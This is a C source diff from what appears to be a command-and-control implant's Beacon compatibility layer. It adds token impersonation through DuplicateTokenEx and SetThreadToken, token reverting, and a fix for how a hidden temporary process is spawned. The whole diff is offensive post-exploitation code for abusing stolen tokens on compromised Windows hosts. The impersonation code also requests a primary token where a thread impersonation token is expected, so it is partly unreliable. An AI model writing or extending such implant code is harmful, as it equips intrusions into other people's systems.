@@ -246,13 +246,22 @@ VOID BeaconFormatInt( PFORMAT format, int value)
 
 BOOL BeaconUseToken( HANDLE token )
 {
-    // TODO: handle this
+    HANDLE hImpersonateToken = INVALID_HANDLE_VALUE;
+
+    if (!DuplicateTokenEx(token, 0, NULL, SecurityImpersonation, TokenPrimary, &hImpersonateToken)) {
+        return FALSE;
+    }
+    if (!SetThreadToken(NULL, hImpersonateToken)) {
+        return FALSE;
+    }
+
     return TRUE;
 }
 
 VOID BeaconRevertToken( VOID )
 {
-    // TODO: handle this
+    if (!Instance->Win32.RevertToSelf())
+        return;
 }
 
 VOID BeaconGetSpawnTo( BOOL x86, char* buffer, int length )
@@ -291,13 +300,16 @@ BOOL BeaconSpawnTemporaryProcess( BOOL x86, BOOL ignoreToken, STARTUPINFO* sInfo
     if (ignoreToken) {
         bSuccess = Instance->Win32.CreateProcessA(NULL, Path, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, sInfo, pInfo);
     } else {
-        PWCHAR wPath = NULL;
-        SIZE_T Size = 0;
+        PWCHAR wPath    = NULL;
+        SIZE_T Size     = 0;
+        SIZE_T Len      = 0;
 
-        Size = strlen(Path) * sizeof(WCHAR);
+        Len = strlen(Path) + 1;
+        Size = Len * sizeof(WCHAR);
         wPath = (PWCHAR) malloc(Size);
+        memset(wPath, 0, Size);
 
-        if (!toWideChar(Path, wPath, Size)) {
+        if (toWideChar(Path, wPath, Size) <= 0) {
             return FALSE;
         }
 
